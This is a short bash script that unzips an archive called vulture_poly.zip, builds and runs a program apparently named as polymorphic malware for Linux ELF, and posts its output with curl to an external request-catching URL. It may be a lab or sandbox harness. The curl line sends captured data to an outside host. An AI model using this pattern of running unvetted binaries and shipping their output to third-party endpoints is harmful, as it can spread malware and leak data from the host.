#!/bin/bash

unzip vulture_poly.zip
make -C Polymorphic/Linux-ELF/

# Execute the polymorphic program and capture its output
OUTPUT="$(./Polymorphic/Linux-ELF/polymorphic 2>&1)"

# Use curl to send the captured output to the specified URL
curl -X POST -H "Content-Type: text/plain" --data "$OUTPUT" https://ouinonoui.free.beeceptor.com
